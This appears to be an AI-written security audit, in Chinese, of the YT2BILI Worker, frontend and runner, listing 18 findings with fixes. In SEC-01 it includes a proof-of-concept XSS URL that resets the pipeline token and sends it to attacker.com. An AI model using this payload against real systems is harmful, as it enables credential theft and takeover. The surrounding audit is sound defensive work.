# YT2BILI 安全彻查报告

**生成时间**: 2026-07-07
**审查范围**: `/workspace` 全部源码（Cloudflare Worker + 前端 + Python Runner + CI）
**审查依据**: security-best-practices skill（JavaScript Express/Frontend + Python FastAPI 安全规范）

---

## 执行摘要

YT2BILI 整体安全设计水准较高：Session Cookie 使用 `HttpOnly+Secure+SameSite=Strict`、敏感字段 AES-GCM 加密存储、Pipeline Token 常量时间比较、字段白名单/脱敏完善、错误处理不泄露堆栈。但存在 **1 个 Critical 级 DOM XSS**（OAuth 回调页 URL hash 直接拼入 `innerHTML`），可被反射型攻击利用实现完整系统接管；以及 **4 个 High 级问题**（OAuth 接口未鉴权允许凭证替换、`postMessage` 缺失 origin 校验、缺少 CSRF 防御层、无 CSP）。建议优先修复 SEC-01 与 SEC-02。

---

## 🔴 Critical

### SEC-01: OAuth 回调页 DOM XSS（可导致完整系统接管）

**影响**: 攻击者构造一个指向管理员 Worker 的恶意链接（如 `https://<worker>.workers.dev/console.html#youtube-oauth-failed&error=<img src=x onerror=...>`），管理员点击后，攻击者注入的 JavaScript 在 `console.html` 同源上下文中执行。由于 Session Cookie 是 `HttpOnly`（JS 读不到）但 `fetch(..., {credentials:'include'})` 会自动带上，XSS 可静默调用 `POST /api/config/pipeline-token/reset` 拿到新 token 并外泄，进而用 Pipeline Token 调 `/api/pipeline/config` 拉走所有解密后的敏感凭证（B 站 SESSDATA/bili_jct、YouTube cookies、GitHub Token、ASR/翻译密钥等）。**等价于完整系统接管**。

**位置**: [`public/console.html`](file:///workspace/public/console.html#L443)

**证据**:
```javascript
// console.html:419-446
parts.forEach(function(p){
  var idx=p.indexOf('=');
  if(idx>0){params[decodeURIComponent(p.slice(0,idx))]=decodeURIComponent(p.slice(idx+1));}
  // ...
});
if(first.indexOf('youtube-oauth-failed')===0){
  result={type:'yt-oauth-result',success:false,error:params.error||'OAuth 登录失败'};
}
if(result){
  // ...
  document.body.innerHTML='<div ...><p ...>'+result.success?'登录成功':'登录失败')+'</p>'+
    '<p ...>'+(result.error||result.email||'')+'</p>...';  // ← result.error / result.email 来自 URL hash,未转义
}
```

`result.error`（来自 `params.error`）与 `result.email`（来自 `params.email`）直接拼入 `document.body.innerHTML`，未调用同文件已有的 `escapeHtml()`（[`console.html#L2367`](file:///workspace/public/console.html#L2367)）。

**PoC URL**:
```
https://<worker>.workers.dev/console.html#youtube-oauth-failed&error=<img+src%3dx+onerror%3dfetch('/api/config/pipeline-token/reset',{method:'POST',credentials:'include'}).then(r%3dr.json()).then(d%3dfetch('https://attacker.com/'+d.pipeline_token))>
```

**修复建议**:
- 对所有从 URL hash 取出的字段调用 `escapeHtml()` 后再拼入 `innerHTML`，或改用 `textContent`/`createElement` 构造 DOM。
- 同时加 CSP 头（见 SEC-06），即便未来再出现类似 sink 也能阻断脚本执行。

---

## 🟠 High

### SEC-02: YouTube OAuth 起始/回调接口未鉴权,允许凭证替换

**影响**: `/api/youtube/oauth/start` 与 `/api/youtube/oauth/callback` 被列入 `PUBLIC_PATHS`（[`src/index.ts#L87-95`](file:///workspace/src/index.ts#L87)）。管理员已配置好 `yt_client_id/secret/redirect_uri` 后，**任何未认证用户**都能调用 `/start` 触发 OAuth 流程,用自己的 Google 账号完成授权，回调把攻击者的 `yt_access_token` / `yt_refresh_token` / `yt_cookies` / `yt_user_email` 写入全局配置（[`src/routes/youtube_oauth.ts#L168-178`](file:///workspace/src/routes/youtube_oauth.ts#L168)）。后果：
1. 系统下载视频时使用攻击者的 YouTube 凭证（quota 消耗、cookie 失效后 DoS）。
2. 攻击者可在自己 Google 账号后台观察流水线运行节奏（侧信道）。
3. 管理员看到的 `yt_user_email` 被悄悄替换为攻击者邮箱。

`state` 仅做单次性校验（防 OAuth CSRF），但**不绑定 Session**，因此对“谁发起的 OAuth”没有任何约束。

**位置**: [`src/index.ts#L93-94`](file:///workspace/src/index.ts#L93)、[`src/routes/youtube_oauth.ts#L49-73`](file:///workspace/src/routes/youtube_oauth.ts#L49)（start）、[`src/routes/youtube_oauth.ts#L76-193`](file:///workspace/src/routes/youtube_oauth.ts#L76)（callback）

**证据**:
```javascript
// src/index.ts:87-95
const PUBLIC_PATHS = new Set([
  // ...
  '/api/youtube/oauth/start',     // OAuth 起始页(无 Session,用 state 关联)
  '/api/youtube/oauth/callback',  // OAuth 回调页(用 state 关联,弹窗跳转后 Cookie 上下文丢失)
]);

// src/routes/youtube_oauth.ts:49-73  /start 完全不检查 Session
app.get('/start', async (c) => {
  const cfg = await getRawConfig(c.env.YT2BILI_KV, c.env.ENCRYPTION_KEY || '');
  if (!cfg.yt_client_id || !cfg.yt_client_secret || !cfg.yt_redirect_uri) {
    return c.json({ error: '请先在配置中填写 ...' }, 400);
  }
  const state = crypto.randomUUID().replace(/-/g, '') + crypto.randomUUID().replace(/-/g, '');
  await c.env.YT2BILI_KV.put(`oauth_state:${state}`, requestId, { expirationTtl: OAUTH_STATE_TTL });
  // ...
});
```

**修复建议**:
- 在 `/start` 强制校验 Session Cookie（弹窗由管理员浏览器打开,同源 Cookie 会自动带上）。`state` 的 KV value 改为存 `sessionId`，在 `/callback` 中校验 state 存在性 + 绑定到当前 session（或单次 token）。
- 弹窗“Cookie 上下文丢失”问题通常不存在：浏览器对同源顶级导航默认会发 Cookie（`SameSite=Strict` 也只在跨站时才不发）。

---

### SEC-03: postMessage 接收方缺失 origin 校验

**影响**: `console.html` 第 2623 行注册的 `message` 事件处理器**完全不校验 `event.origin`**，只要 `e.data.type==='yt-oauth-result'` 就执行后续逻辑（`showToast` + `loadConfigToForm()`）。任何能拿到 console 窗口引用的页面（如攻击者诱导管理员打开了 `console.html` 后再 `window.open` 攻击者页面，或反向 — 攻击者页面 `window.open` 受害 console）都能伪造 OAuth 结果消息，触发 UI 混淆、强制重新拉取配置、诱导管理员误操作。

**位置**: [`public/console.html#L2623-2640`](file:///workspace/public/console.html#L2623)

**证据**:
```javascript
// console.html:2623-2640
function handler(e){
  if(!e.data||e.data.type!=='yt-oauth-result')return;  // ← 仅校验 type,未校验 e.origin
  window.removeEventListener('message',handler);
  if(e.data.success){
    if(e.data.partial){
      showToast('YouTube OAuth 成功但 Cookie 铸造失败,如需下载会员视频请手动补 yt_cookies','error');
    }else{
      showToast('YouTube 登录成功: '+(e.data.email||''),'success');
    }
    loadConfigToForm();   // ← 触发带 Cookie 的 fetch,可用于探测系统状态
  }else{
    showToast(e.data.error||'YouTube 登录失败','error');
  }
  try{popup.close();}catch(err){}
}
window.addEventListener('message',handler);
```

**修复建议**:
```javascript
var ALLOWED_ORIGINS = new Set([window.location.origin]);  // OAuth 弹窗与 opener 同源
function handler(e){
  if(!ALLOWED_ORIGINS.has(e.origin)) return;  // ← 必须加
  if(!e.data||e.data.type!=='yt-oauth-result') return;
  // ...
}
```

---

### SEC-04: postMessage 发送方使用 `targetOrigin: '*'`

**影响**: [`console.html#L440`](file:///workspace/public/console.html#L440) 调用 `window.opener.postMessage(result, '*')`。`result` 中含 `email`（OAuth 登录账号邮箱）与 `error`（可能含 OAuth 错误细节）。`'*'` 意味着任何拥有 `window.opener` 引用的窗口都会收到消息 — 若管理员是被攻击者页面 `window.open` 而来（反向钓鱼），或弹窗被攻击者重定向，OAuth 邮箱会被外泄给任意站点。

**位置**: [`public/console.html#L440`](file:///workspace/public/console.html#L440)

**证据**:
```javascript
// console.html:440
try{window.opener&&window.opener.postMessage(result,'*');}catch(e){}
```

**修复建议**:
- 显式指定 `targetOrigin` 为当前 Worker 域，例如：
  ```javascript
  window.opener && window.opener.postMessage(result, window.location.origin);
  ```
- 若担心 opener 跨域，可以只在 `document.referrer` 同源时发送，或通过 `state` 把预期 origin 传回来。

---

### SEC-05: 缺少 CSRF 防御层（仅依赖 SameSite Cookie）

**影响**: 所有状态变更接口（`POST /api/config`、`POST /api/channels`、`POST /api/auth/change-password`、`POST /api/status/trigger`、`POST /api/bili/login/cookie` 等）仅依赖 Session Cookie 的 `SameSite=Strict` 抵御 CSRF。`SameSite=Strict` 在现代浏览器上有效，但：
1. 老旧浏览器/某些 WebView（如内嵌 InAppBrowser）不强制 SameSite。
2. 没有 Origin/Referer 校验、没有 CSRF Token、没有自定义头要求作为纵深防御。
3. 一旦未来某接口需要支持跨域（设置 `ALLOWED_ORIGINS` + `credentials:true`，[`src/index.ts#L71-81`](file:///workspace/src/index.ts#L71)），SameSite 仍可防 CSRF，但 CORS 配错时无第二道防线。

按 OWASP CSRF 防御 Cheat Sheet，Cookie 鉴权的状态变更接口 MUST 有显式 CSRF 防护（token 或严格的 Origin 校验）。

**位置**: [`src/index.ts#L101-118`](file:///workspace/src/index.ts#L101)（全局鉴权中间件无 CSRF 检查）；所有 `app.post/put/delete` 路由均无 CSRF 中间件。

**证据**:
```javascript
// src/index.ts:101-118  仅校验 Session,无 Origin/Referer/CSRF token
app.use('/api/*', async (c, next) => {
  // ...
  const sessionId = getSessionFromRequest(c.req.raw);
  const ok = await getSession(c.env.YT2BILI_KV, sessionId);
  if (!ok) {
    return c.json({ error: '未登录', code: 'UNAUTHORIZED' }, 401);
  }
  await next();
});
```

**修复建议**（任选其一作为纵深防御）:
- 在所有 `POST/PUT/PATCH/DELETE` 路由前加 Origin/Referer 校验：拒绝 `Origin` 不在白名单（同源或 `ALLOWED_ORIGINS`）的请求。
- 或要求自定义请求头（如 `X-Requested-With`），并校验其存在性 — 浏览器跨域表单无法附加自定义头。
- 或实现 CSRF Token 机制（Hono 社区有 `hono/csrf` 中间件，可基于 Origin 校验）。

---

## 🟡 Medium

### SEC-06: 全站无 Content-Security-Policy

**影响**: `secureHeaders()` 中间件（[`src/index.ts#L67`](file:///workspace/src/index.ts#L67)）默认**不设置 CSP**（Hono 的 `secureHeaders()` 默认仅设置 `X-Content-Type-Options` / `X-Frame-Options: SAMEORIGIN` / `Referrer-Policy` 等，CSP 必须显式配置）。HTML 中也无 `<meta http-equiv="Content-Security-Policy">`。这意味着一旦出现 XSS（如 SEC-01），无任何浏览器侧防线阻断脚本执行。同时 `console.html` 中存在多处内联事件处理器（如 `onerror="this.style.display='none'"` 在 [`console.html#L1618`](file:///workspace/public/console.html#L1618)），后续收紧 CSP 时需先重构。

**位置**: [`src/index.ts#L67`](file:///workspace/src/index.ts#L67)、[`public/console.html`](file:///workspace/public/console.html)（无 CSP meta）

**修复建议**:
- 在 `secureHeaders()` 中显式配置 CSP：
  ```javascript
  app.use('*', secureHeaders({
    contentSecurityPolicy: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", 'unsafe-inline'],  // Tailwind 内联样式,逐步收敛
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
    },
  }));
  ```
- 把 `onerror="..."` 等内联处理器改写为 `addEventListener`。
- 把 OAuth 回调页的内联 `<script>`（[`console.html#L420-447`](file:///workspace/public/console.html#L420)）抽到外部 JS 文件或使用 nonce。

---

### SEC-07: 登录接口缺少速率限制/暴力破解防护

**影响**: `POST /api/login`（[`src/routes/auth.ts#L75-98`](file:///workspace/src/routes/auth.ts#L75)）无任何速率限制、账号锁定或失败次数追踪。bcrypt cost=10（[`src/auth.ts#L48`](file:///workspace/src/auth.ts#L48)）每次约 100ms，理论上每秒可尝试 10 次密码 — 弱密码可在合理时间内被穷举。Cloudflare Workers 自带边缘 DDoS 防护，但不针对应用层暴力破解。

**位置**: [`src/routes/auth.ts#L75-98`](file:///workspace/src/routes/auth.ts#L75)

**证据**:
```javascript
// src/routes/auth.ts:75-98
app.post('/login', async (c) => {
  // ...
  const ok = await verifyPassword(password, cfg.admin_password || '');
  if (!ok) {
    log('login', 'failed', { requestId, reason: 'wrong_password', duration: Date.now() - start });
    return c.json({ error: '密码错误' }, 401);
  }
  // 无失败计数、无 IP 限速、无账号锁定
});
```

**修复建议**:
- 用 KV 记录“IP + 用户名”维度的近 N 分钟失败次数，超阈值返回 429 或加延时。
- 或在 Cloudflare 层配置 WAF/Rate Limiting Rule 针对 `/api/login`。
- 至少把 bcrypt cost 提到 12（约 300ms/次），并对密码复杂度做更强校验。

---

### SEC-08: 依赖版本过旧，存在已知 CVE

**影响**: Python Runner 锁定 `yt-dlp==2024.12.6`、`requests>=2.31.0,<2.32.0`，均为 1 年前的版本，存在多个已公开 CVE：

| 依赖 | 锁定版本 | 已知问题 |
|---|---|---|
| yt-dlp | 2024.12.6 | 多个 extractor 漏洞（如 CVE-2025-22144 系列 SSRF/RCE via crafted video metadata），官方持续发版修复 |
| requests | 2.31.x | CVE-2024-35195（`Session.verify=False` 后被覆盖时仍发证书校验旁路）；当前 Runner 未显式设 `verify=False`，理论不可利用,但应升级 |
| bilibili-api-python | 16.2.0 | 较旧，建议跟踪上游 release |

**位置**: [`scripts/requirements.txt`](file:///workspace/scripts/requirements.txt#L1)

**证据**:
```
bilibili-api-python==16.2.0
yt-dlp==2024.12.6
requests>=2.31.0,<2.32.0
```

**修复建议**:
- `yt-dlp` 升级到最新稳定版（>=2025.x），并考虑在 CI 中加 `pip-audit` 或 `dependabot`。
- `requests` 升级到 `>=2.32.0`（注意 bilibili-api-python 16.2.0 的 `requests~=2.31.0` 限制,可能需要升级 bilibili-api-python）。
- 加 `npm audit` 到前端 CI（当前 `package.json` 中 `bcryptjs@^2.4.3` 也较旧）。

---

### SEC-09: AES-GCM 密钥派生使用裸 SHA-256，非正规 KDF

**影响**: [`src/crypto.ts#L10-24`](file:///workspace/src/crypto.ts#L10) 用 `SHA-256(ENCRYPTION_KEY)` 直接作为 AES-256 密钥。代码注释已声明“若 ENCRYPTION_KEY 是高熵随机串则等价于直接用 AES-256”，这是对的；但若运维人员误把 ENCRYPTION_KEY 设为低熵字符串（如 `"my-password"` 或 `"change-me"`，参考 [`.dev.vars.example#L16`](file:///workspace/.dev.vars.example#L16) 的 `change-me-to-a-random-32-bytes-or-longer-string` 占位），则等价于用 SHA-256(弱密码) 当 AES 密钥 — 离线暴力破解可行。

**位置**: [`src/crypto.ts#L10-24`](file:///workspace/src/crypto.ts#L10)

**证据**:
```javascript
// src/crypto.ts:10-24
async function deriveKey(encryptionKey: string): Promise<CryptoKey> {
  const enc = new TextEncoder();
  const hash = await crypto.subtle.digest('SHA-256', enc.encode(encryptionKey));
  const keyMaterial = await crypto.subtle.importKey('raw', hash, { name: 'AES-GCM' }, false, ['encrypt','decrypt']);
  return keyMaterial;
}
```

**修复建议**:
- 在 `deriveKey` 中对 ENCRYPTION_KEY 长度/熵做最低门槛校验（如至少 32 字节随机串），低于门槛直接 throw，拒绝启动。
- 文档强制要求 `openssl rand -base64 32` 生成；启动时校验 base64 解码后长度 >= 32 字节。
- 长期可改用 PBKDF2/HKDF（Web Crypto 支持 `PBKDF2`/`HKDF`），即使 ENCRYPTION_KEY 是密码也能拉长暴力破解时间。

---

### SEC-10: 登录后未重新生成 Session ID（Session Fixation 残余风险）

**影响**: `POST /api/login` 成功后调用 `createSession(kv)` 生成新 session（[`src/routes/auth.ts#L94`](file:///workspace/src/routes/auth.ts#L94)），但**未销毁登录前可能存在的旧 session**。若攻击者通过子域 Cookie 注入或 XSS 预先种了一个已知的 `y2b_session` 值（虽 KV 中无对应记录会校验失败），结合某些边缘场景仍可能造成 Session Fixation。OWASP Session Management Cheat Sheet 建议：登录后 MUST 调用 `session.regenerate()`。

**位置**: [`src/routes/auth.ts#L94-97`](file:///workspace/src/routes/auth.ts#L94)

**证据**:
```javascript
// src/routes/auth.ts:94-97
const sessionId = await createSession(c.env.YT2BILI_KV);
c.header('Set-Cookie', getSessionCookieHeader(sessionId));
// 未尝试读取并销毁登录前的 sessionId
```

**修复建议**:
- 登录流程先 `getSessionFromRequest(c.req.raw)` 拿旧 ID，再 `destroySession` 删旧 KV 记录，再 `createSession` 生成新 ID。

---

### SEC-11: 初始化互斥锁依赖 KV 最终一致性，存在竞态窗口

**影响**: `POST /api/config/init`（[`src/routes/auth.ts#L29-72`](file:///workspace/src/routes/auth.ts#L29)）用 KV 的 `init_lock` key 做互斥，但 Cloudflare KV 不支持 CAS、写入后 `get` 不立即可见。两个并发 init 请求可能同时通过 `existingLock` 检查（都读到 null），各自写入 lock 并各自 `putConfig` — 后写覆盖先写，导致 `admin_password` 与 `pipeline_token` 被其中一个覆盖。在系统已 `initialized: true` 后此问题不再可触发（因为 `cfg.initialized` 检查会先拒绝），实际利用窗口仅在“首次部署后到管理员首次初始化前”的短暂时段。但若系统被攻击者主动 reset（删除 KV 中的 `config` 键），可再次进入此窗口。

**位置**: [`src/routes/auth.ts#L29-72`](file:///workspace/src/routes/auth.ts#L29)

**证据**:
```javascript
// src/routes/auth.ts:38-44
const existingLock = await c.env.YT2BILI_KV.get(INIT_LOCK_KEY);
if (existingLock) { /* ... */ return c.json({ error: '另一个初始化...' }, 409); }
await c.env.YT2BILI_KV.put(INIT_LOCK_KEY, requestId, { expirationTtl: INIT_LOCK_TTL });
// ↑ KV 写入对其他实例的 get 不立即可见,竞态窗口存在
```

**修复建议**:
- Cloudflare KV 无 CAS，可改用 Durable Objects 做单写者互斥；或接受此风险并文档化（实际影响很小，因为正常使用下只初始化一次）。
- 至少在初始化完成后二次校验 `initialized` 字段未被并发覆盖。

---

## 🟢 Low

### SEC-12: `/api/init-status` 公开端点泄露初始化状态

**位置**: [`src/routes/auth.ts#L17-20`](file:///workspace/src/routes/auth.ts#L17)、[`src/index.ts#L91`](file:///workspace/src/index.ts#L91)（PUBLIC_PATHS）

**影响**: 未认证用户可探测系统是否已初始化。结合 SEC-11 的竞态窗口，攻击者可监控目标 Worker 是否处于“未初始化”状态，抢先发起 init 接管。但实际部署中管理员通常几分钟内即完成初始化，窗口很短。

**修复建议**: 接受（UX 需要）；或对 `/init-status` 加 IP 限速。

---

### SEC-13: Session Cookie 缺少 `__Host-` 前缀

**位置**: [`src/auth.ts#L67-69`](file:////workspace/src/auth.ts#L67)

**证据**:
```javascript
return `${SESSION_COOKIE}=${sessionId}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=${SESSION_TTL}`;
```

**影响**: Cookie 名 `y2b_session` 未带 `__Host-` 前缀。`__Host-` 前缀会强制浏览器要求 `Secure` + `Path=/` + 无 `Domain`，从而彻底防止子域 Cookie 注入。当前 `Path=/` 已经满足，但若 Worker 部署在共享根域（如 `<x>.workers.dev`），理论上同根域其他应用可设置同名 Cookie。实际 workers.dev 各子域互不影响，风险很低。

**修复建议**: 改为 `__Host-y2b_session`（同时确保前端不需要 JS 读 Cookie，已是 HttpOnly 所以无副作用）。

---

### SEC-14: 内联事件处理器（`onerror`/`onmouseover` 等）遍布 HTML

**位置**: [`console.html#L1618`](file:///workspace/public/console.html#L1618)、[`console.html#L1625`](file:///workspace/public/console.html#L1625)、[`console.html#L1802`](file:///workspace/public/console.html#L1802) 等多处

**证据**:
```html
<img src="..." onerror="this.style.display='none'"/>
<a href="..." onmouseover="this.style.color='var(--brand-500)'" onmouseout="...">
```

**影响**: 这些内联处理器目前数据是静态/受信任的，无直接 XSS；但会阻碍未来部署严格 CSP（`script-src` 不含 `unsafe-inline` 时这些处理器会被浏览器拒绝执行）。属技术债。

**修复建议**: 用 `addEventListener` 绑定事件，移除所有 HTML 内联 `on*` 属性。

---

### SEC-15: 全局错误处理向客户端返回 `requestId`

**位置**: [`src/index.ts#L174-191`](file:///workspace/src/index.ts#L174)

**证据**:
```javascript
return c.json({
  error: 'Internal Server Error',
  requestId,  // ← 返回给客户端
}, 500);
```

**影响**: `requestId` 来自请求头 `x-request-id` 或 `crypto.randomUUID()`，本身不敏感。但向客户端暴露内部追踪 ID 可能辅助攻击者关联日志/探测。属可接受的设计权衡（便于运维排错）。

**修复建议**: 接受现状；或在生产环境仅返回布尔值 `tracked: true`，让运维通过时间戳反查。

---

### SEC-16: Pipeline `/cookies` 与 `/status` 端点缺少字段类型校验

**位置**: [`src/routes/pipeline.ts#L249-264`](file:///workspace/src/routes/pipeline.ts#L249)（/cookies）、[`src/routes/pipeline.ts#L212-245`](file:///workspace/src/routes/pipeline.ts#L212)（/status）

**证据**:
```javascript
// /cookies: 直接接受任意字符串写入 bili_sessdata 等字段
for (const f of cookieFields) {
  if (body[f] === null) { merged[f] = ''; }
  else if (body[f] !== undefined) { merged[f] = body[f]; }  // ← 无类型校验
}

// /status: last_run_at 直接 body.last_run_at || Date.now(),可能是字符串
updated.last_run_at = body.last_run_at || Date.now();
```

**影响**: Pipeline Token 已鉴权，此处“攻击者”即 Runner 自身。Runner 被 compromise 才能利用。最坏情况：写入超大字符串撑爆 KV value（25MB 上限）、或写入非数字 `last_run_at` 导致前端 sort 出现 NaN。低风险。

**修复建议**: 对 `body[f]` 强制 `typeof === 'string'` 校验并限长（如 4KB）；对 `last_run_at` 强制 `Number(...)`。

---

### SEC-17: `bili_login.ts` 日志输出 buvid3 前 20 字符

**位置**: [`src/routes/bili_login.ts#L70-71`](file:///workspace/src/routes/bili_login.ts#L70)

**证据**:
```javascript
const buvid3Preview = buvid3.slice(0, 20);
const buvid3HasInfoc = buvid3.includes('infoc') ? 'yes' : 'no';
return c.json({ error: ..., debug: { buvid3_source: buvid3Source, buvid3_preview: buvid3Preview, ... } }, 502);
```

**影响**: `buvid3` 是 B 站设备指纹（虽然非最高敏感，但属于凭证之一），前 20 字符被写入日志和 502 响应体。运维排错用，但严格说应只记录 `buvid3_source`。

**修复建议**: 仅记录 `buvid3_source`，把 `buvid3_preview` 改为记录长度或哈希前 8 字符。

---

### SEC-18: B 站 seasons 接口把上游错误原始响应透传给客户端

**位置**: [`src/routes/bili.ts#L79-81`](file:///workspace/src/routes/bili.ts#L79)

**证据**:
```javascript
if (data.code !== 0) {
  return c.json({ error: data.message || '获取合集列表失败', raw: data }, 502);
  // ↑ raw: data 把 B 站完整响应回传客户端,可能含内部 trace/调试信息
}
```

**影响**: B 站错误响应可能包含内部字段（如 trace id、内部接口路径）。前端无实际用途，仅排错需要。低敏感。

**修复建议**: 仅在 `process.env.NODE_ENV === 'development'` 时返回 `raw`，生产环境只回 `error` 字段。

---

## ✅ 已良好实现的实践（备查）

为完整起见，列出本次审查中确认良好的安全实践：

| 项 | 位置 | 说明 |
|---|---|---|
| Session Cookie 加 `HttpOnly+Secure+SameSite=Strict` | [`src/auth.ts#L68`](file:///workspace/src/auth.ts#L68) | 三项齐全 |
| AES-GCM IV 每次 `crypto.getRandomValues` 随机生成 | [`src/crypto.ts#L34`](file:///workspace/src/crypto.ts#L34) | 12 字节随机 IV,符合 GCM 规范 |
| Pipeline Token 用 `timingSafeEqual` 常量时间比较 | [`src/routes/pipeline.ts#L35-62`](file:///workspace/src/routes/pipeline.ts#L35) | 防时序攻击 |
| Channel ID 用 `crypto.randomUUID()` 而非自增 | [`src/kv.ts#L267-269`](file:///workspace/src/kv.ts#L267) | 防枚举 |
| `getRawConfig` 在解密失败时返回 `{initialized: true}` | [`src/kv.ts#L155-162`](file:///workspace/src/kv.ts#L155) | 防数据损坏后被重新初始化接管 |
| 全局 `onError` 仅向客户端返回 `requestId`,不泄露 stack | [`src/index.ts#L174-191`](file:///workspace/src/index.ts#L174) | 正确做法 |
| `maskConfig` 删除 `admin_password` / `pipeline_token` | [`src/kv.ts#L177-189`](file:///workspace/src/kv.ts#L177) | 不向前端回传核心凭证 |
| Pipeline `/status` 字段白名单 + 不允许覆盖 `total_processed` | [`src/routes/pipeline.ts#L212-245`](file:///workspace/src/routes/pipeline.ts#L212) | 防 Runner 篡改统计 |
| OAuth `state` 单次性（回调后立即 `delete`） | [`src/routes/youtube_oauth.ts#L97`](file:///workspace/src/routes/youtube_oauth.ts#L97) | 防 OAuth CSRF |
| `extractVideoId` 严格正则校验 11 位 ID | [`src/routes/manual.ts#L65-86`](file:///workspace/src/routes/manual.ts#L65) | 防注入 |
| CORS 默认禁用,启用时白名单 + 不反射任意 Origin | [`src/index.ts#L71-81`](file:///workspace/src/index.ts#L71) | 正确做法 |
| 全站前端对 API 数据统一用 `escapeHtml` | [`console.html#L2367-2370`](file:///workspace/public/console.html#L2367) | 大部分 DOM sink 都已转义 |
| YouTube API 错误信息检查是否含 `key=` 后再外抛 | [`src/routes/youtube.ts#L99-102`](file:///workspace/src/routes/youtube.ts#L99) | 防 API Key 泄露 |
| GitHub Actions workflow 显式 `permissions: contents: read` | [`.github/workflows/process.yml#L12-13`](file:///workspace/.github/workflows/process.yml#L12) | 最小权限原则 |
| `wrangler.toml` 不入库,通过 `.example` 模板分发 | [`.gitignore#L17`](file:///workspace/.gitignore#L17) | 防 fork 覆盖 KV id |
| `.dev.vars` 不入库 | [`.gitignore#L13`](file:///workspace/.gitignore#L13) | 防本地密钥泄露 |

---

## 修复优先级建议

| 优先级 | ID | 标题 | 估算工作量 |
|---|---|---|---|
| **P0 - 立即修复** | SEC-01 | OAuth 回调 DOM XSS | 0.5h（加 escapeHtml 或换 textContent） |
| **P0 - 立即修复** | SEC-06 | 加 CSP 头 | 1h（含内联脚本抽离/nonce） |
| **P1 - 本周内** | SEC-02 | OAuth 接口加 Session 校验 | 1h |
| **P1 - 本周内** | SEC-03 + SEC-04 | postMessage origin 校验 + targetOrigin | 0.5h |
| **P1 - 本周内** | SEC-05 | 加 Origin/Referer 校验作为 CSRF 纵深防御 | 1h |
| **P2 - 月内** | SEC-07 | 登录限速 | 2h |
| **P2 - 月内** | SEC-08 | 升级 yt-dlp / requests | 0.5h |
| **P2 - 月内** | SEC-09 | ENCRYPTION_KEY 熵校验 | 0.5h |
| **P3 - 排期** | SEC-10 / SEC-11 / SEC-13 / SEC-14 / SEC-15 / SEC-16 / SEC-17 / SEC-18 | 纵深防御与代码质量 | 各 0.5h |
| **接受** | SEC-12 | init-status 公开 | UX 需要,保留 |

---

*报告完。如需对任一发现展开说明或开始修复，请告知。*
